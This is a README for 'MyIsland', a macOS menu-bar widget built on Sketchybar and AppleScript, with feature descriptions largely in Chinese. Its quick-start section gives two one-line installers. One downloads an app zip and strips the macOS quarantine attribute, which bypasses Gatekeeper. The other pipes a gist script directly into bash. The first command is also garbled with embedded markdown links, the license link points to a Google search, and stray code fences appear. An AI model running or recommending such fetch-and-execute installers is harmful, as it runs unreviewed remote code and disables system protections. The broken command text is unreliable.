# MyIsland 🧠🔥 — macOS Dynamic Island Reimagined

> "I keep coming back to this one — the way heat and memory coil inside a silhouette. Like your thoughts were made of smoke, but it’s not empty. It’s alive."

MyIsland 不仅仅是一个菜单栏组件，它是一个**基于实时系统状态的感官反馈引擎**。通过高度优化的 Shell 逻辑，它将你的 macOS 菜单栏转化为一个充满生命力的“思维岛屿”。

---

## 🚀 一键部署 (Quick Start)

无需手动配置路径，直接在终端执行：

```bash
/bin/bash -c "$(curl -fsSL [https://github.com/Shellingfordh/MyIsland/raw/main/MyIsland.zip](https://github.com/Shellingfordh/MyIsland/raw/main/MyIsland.zip) -o /tmp/MyIsland.zip && unzip -q -o /tmp/MyIsland.zip -d /tmp/ && rm -rf /Applications/MyIsland.app && mv /tmp/MyIsland.app /Applications/ && xattr -rd com.apple.quarantine /Applications/MyIsland.app && echo 'Done! MyIsland is now in your Applications folder.')"

```
gist
```bash
curl -sL https://gist.githubusercontent.com/Shellingfordh/d59225650f7c3512f1d885fa2127a858/raw/island_install.sh | bash

```
---

## ✨ 核心技术特性 (Technical Highlights)

### 1. 24位丝滑多色流动算法 (Neural Flow Engine)

MyIsland 内置了一套精细的色彩动力学逻辑，不同于普通的单色呼吸：

* **实时 TICKS 计算**：利用系统纳秒级时间戳驱动色彩偏移。
* **对称式色彩矩阵 (ABCDCBA)**：通过 `f87171` 到 `9333ea` 的 24 位高饱和色库，实现药丸两端颜色不同且流动丝滑。
* **动态 Alpha 呼吸**：确保边框在 `0xcc` (80%) 到 `0xff` (100%) 之间循环，防止颜色在极暗环境下消失。

### 2. 智能 App 颜色提取 (Adaptive Color Mapping)

代码预设了超过 **50 种** 主流应用的颜色深度映射。当你在不同 App 间切换时，岛屿的边框色会自动“通感”：

* **流媒体深度适配**：支持 YouTube (红/黑)、Bilibili (粉/蓝)、Spotify (绿/黑) 等。
* **社交媒体感知**：Telegram、WeChat、Threads、Instagram 等均有专属双色渐变。
* **浏览器流光检测**：当你在浏览器访问 Gemini 或 iCloud 时，岛屿会触发特殊的“彩虹流动”模式。

### 3. 后台播放器同步 (Media Sync)

实时轮询 Spotify、Apple Music、网易云音乐等播放状态。

* **播放状态感知**：自动提取曲目名称并实时展示。
* **交互控制**：点击药丸即可执行 `playpause`，无需切换窗口。

### 4. 极速 UI 渲染与缓存

* **合并 AppleScript 调用**：将 App 名与 Bundle ID 获取合并为单次执行，大大降低 CPU 占用。
* **状态增量更新**：只有当 `STATUS` 或 `TITLE` 发生变化时才触发宽度动画，平时仅更新颜色与角度。

---

## 🛠 功能细节 (Functional Specs)

| 功能 | 逻辑实现 | 视觉反馈 |
| --- | --- | --- |
| **通知提醒** | 拦截 `notification_occurrence` | 🔔 + 消息缩略语 |
| **交互逻辑** | 点击触发 Launchpad / 播放暂停 | 药丸动态伸缩动画 |
| **浏览器模式** | 获取当前活跃标签页标题 | 🔍 智能图标 + 站点主题色 |
| **系统状态** | 监控 IDLE 与 Focus 切换 |  经典呼吸灯模式 |

---

## 🤝 开发者信息

* **技术栈**：Shell Script, AppleScript, Sketchybar API.
* **协议**：[MIT License](https://www.google.com/search?q=LICENSE)


```

---

## Config Docs
See `README_CONFIG.md` for technical documentation and version notes.
